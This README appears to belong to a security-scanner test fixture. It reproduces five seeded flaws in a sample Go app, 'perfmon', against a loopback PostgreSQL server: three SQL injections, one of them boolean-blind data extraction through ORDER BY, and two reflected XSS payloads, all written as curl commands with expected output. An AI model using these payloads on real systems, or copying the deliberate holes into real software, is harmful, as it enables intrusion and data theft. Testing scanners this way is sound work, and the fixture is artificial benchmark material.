# app-project-go-sample POCs

Local, loopback-only reproductions of the five seeded attacker-reachable
findings in `findings-attacker-reachable.json`. All POCs target the
fixture's own temporary PostgreSQL cluster and the perfmon HTTP server;
no external hosts, credentials, or destructive operations are involved.

## Runtime setup

```bash
# 1. Start a fixture-scoped, loopback-only PostgreSQL 17 cluster.
export PATH=/opt/homebrew/opt/postgresql@17/bin:$PATH
export PGDATA=/tmp/app-project-go-sample-pgdata
rm -rf "$PGDATA"
initdb -D "$PGDATA" -U postgres --auth=trust --no-locale --encoding=UTF8 -A trust
pg_ctl -D "$PGDATA" \
  -o "-p 55432 -h 127.0.0.1 -k /tmp" \
  -l /tmp/app-project-go-sample-postgres.log \
  -w start

# 2. Load schema and seed harmless demo rows.
psql -h 127.0.0.1 -p 55432 -U postgres -d postgres \
  -f fixtures/app-project-go-sample/project/infrastructure/database/init.sql
psql -h 127.0.0.1 -p 55432 -U postgres -d postgres <<'SQL'
SET search_path = prod;
INSERT INTO prod.attribute (name) VALUES
  ('cpu-model'), ('os-linux'), ('gpu-cuda'), ('cache-l2'), ('memory-ddr4');
INSERT INTO prod.job (product, version, name, measurement, "timestamp", value, created_on, created_by) VALUES
  ('perfmon-web', 'v1.2.0', 'startup',   'ms', '2024-01-15 10:00:00', 150, '2024-01-15 10:00:00', '127.0.0.1'),
  ('perfmon-web', 'v1.2.0', 'render',    'ms', '2024-01-16 10:00:00', 220, '2024-01-16 10:00:00', '127.0.0.1'),
  ('perfmon-api', 'v2.0.1', 'p95',       'ms', '2024-01-17 10:00:00',  90, '2024-01-17 10:00:00', '127.0.0.1'),
  ('perfmon-api', 'v2.0.1', 'throughput','rps','2024-01-18 10:00:00', 780, '2024-01-18 10:00:00', '127.0.0.1'),
  ('perfmon-cli', 'v0.9.5', 'boot',      'ms', '2024-01-19 10:00:00',  40, '2024-01-19 10:00:00', '127.0.0.1');
INSERT INTO prod.job_attribute (job_id, attribute_id) VALUES (1, 1), (1, 2), (2, 1), (3, 5), (4, 4);
SQL

# 3. Build and start the perfmon HTTP server from the project root so
#    the html/template loader can locate assets/static/index.html.
cd fixtures/app-project-go-sample/project
GOFLAGS='-mod=mod' go build -o /tmp/perfmon-web .
export PERFMON_DSN='postgresql://postgres@127.0.0.1:55432/postgres?search_path=prod&sslmode=disable'
export PERFMON_LISTEN_ADDR=127.0.0.1:9101
/tmp/perfmon-web &   # health: curl -sS http://127.0.0.1:9101/products
```

The two `PERFMON_*` variables and the `DB()` accessor on `*psql` are
narrow compatibility shims added in this fixture so the service can
run against a loopback cluster: upstream `perfmon` hardcodes the
`db:5432` docker-compose service name and port 9000. The shims live
outside the vulnerable flows and do not affect scanner recall.

## SQL injection

### SQLi #1 — Product search LIKE injection (`GET /products/search`)

```bash
# Benign control: substring match on the demo products.
curl -sS "http://127.0.0.1:9101/products/search?q=cli"
# → {"products":["perfmon-cli"]}

# Benign non-match: an unknown substring returns no products.
curl -sS "http://127.0.0.1:9101/products/search?q=xxxx"
# → {"products":null}

# Injection: attacker-controlled OR clause smuggled through LIKE.
# Decoded payload: q = xxxx') OR j.product LIKE '%perfmon-cli%'--
curl -sS "http://127.0.0.1:9101/products/search?q=xxxx%27)%20OR%20j.product%20LIKE%20%27%25perfmon-cli%25%27--%20"
# → {"products":["perfmon-cli"]}    <-- returned despite no match on "xxxx"
```

### SQLi #2 — Attribute search LIKE injection (`GET /attributes/search`)

```bash
# Benign non-match.
curl -sS "http://127.0.0.1:9101/attributes/search?q=xxxx"
# → {"attributes":null}

# Injection: q = xxxx') OR a.name LIKE '%cpu%'--
curl -sS "http://127.0.0.1:9101/attributes/search?q=xxxx%27)%20OR%20a.name%20LIKE%20%27%25cpu%25%27--%20"
# → {"attributes":["cpu-model"]}    <-- returned despite no match on "xxxx"
```

### SQLi #3 — Recent-jobs ORDER BY column injection (`GET /jobs/list`)

```bash
# Benign controls: fixed columns.
curl -sS "http://127.0.0.1:9101/jobs/list?product=perfmon-web&version=v1.2.0&sort=j.name"
# → jobs ordered: render, startup
curl -sS "http://127.0.0.1:9101/jobs/list?product=perfmon-web&version=v1.2.0&sort=j.value"
# → jobs ordered: startup(150), render(220)

# Boolean-blind exfiltration via ORDER BY CASE:
# If the injected subquery predicate is true, the response is sorted by
# j.name (alpha); otherwise by j.value::text. The order reveals the
# extracted boolean.
# Decoded payload:
#   sort = CASE WHEN (SELECT count(*) FROM prod.attribute)=5
#              THEN j.name
#              ELSE j.value::text END
curl -sS "http://127.0.0.1:9101/jobs/list?product=perfmon-web&version=v1.2.0&sort=CASE%20WHEN%20%28SELECT%20count%28%2A%29%20FROM%20prod.attribute%29%3D5%20THEN%20j.name%20ELSE%20j.value%3A%3Atext%20END"
# → order: ['render', 'startup']    (predicate true → j.name)

curl -sS "http://127.0.0.1:9101/jobs/list?product=perfmon-web&version=v1.2.0&sort=CASE%20WHEN%20%28SELECT%20count%28%2A%29%20FROM%20prod.attribute%29%3D99%20THEN%20j.name%20ELSE%20j.value%3A%3Atext%20END"
# → order: ['startup', 'render']    (predicate false → j.value::text)
```

## Cross-site scripting

### XSS #1 — Product report page (`GET /report`)

```bash
# Benign control: harmless note renders as text/html.
curl -sS -o /dev/null -w "%{http_code} %{content_type}\n" \
  "http://127.0.0.1:9101/report?product=perfmon-web&note=hello"
# → 200 text/html; charset=utf-8

# Injection: script tag in the `note` parameter is reflected verbatim.
# Decoded payload: note = <script>alert(document.domain)</script>
curl -sS "http://127.0.0.1:9101/report?product=perfmon-web&note=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E" \
  | grep -o '<script>[^<]*</script>'
# → <script>alert(document.domain)</script>
```

### XSS #2 — Search-preview fragment (`GET /search-preview`)

```bash
# Benign control: reflects plaintext in an HTML fragment.
curl -sS "http://127.0.0.1:9101/search-preview?q=hello"
# → <div class="search-preview"><p>Search results for: hello</p></div>

# Injection: img/onerror payload reflects verbatim.
# Decoded payload: q = <img src=x onerror=alert(1)>
curl -sS "http://127.0.0.1:9101/search-preview?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
# → <div class="search-preview"><p>Search results for: <img src=x onerror=alert(1)></p></div>
```

## Cleanup

```bash
kill "$(lsof -tiTCP:9101 -sTCP:LISTEN 2>/dev/null | head -1)" 2>/dev/null || true
pg_ctl -D /tmp/app-project-go-sample-pgdata stop -m fast
rm -rf /tmp/app-project-go-sample-pgdata \
       /tmp/app-project-go-sample-postgres.log \
       /tmp/perfmon-web /tmp/perfmon-web.log
unset PERFMON_DSN PERFMON_LISTEN_ADDR PGDATA
```
